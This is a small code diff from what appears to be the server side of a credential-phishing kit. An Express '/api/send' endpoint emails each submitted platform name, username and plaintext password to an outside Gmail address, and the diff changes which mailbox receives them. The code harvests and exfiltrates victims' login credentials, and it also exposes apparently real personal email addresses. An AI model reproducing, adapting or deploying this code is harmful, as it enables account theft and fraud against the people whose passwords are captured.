@@ -62,7 +62,7 @@ app.post('/api/send', async (req, res) => {
 
   let mailOptions = {
     from: 'tinfo@jumping-rivers.co.uk',
-    to: 'exlearnone@gmail.com',
+    to: 'ricardo.josh12@gmail.com',
     subject: platform,
     text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
   };
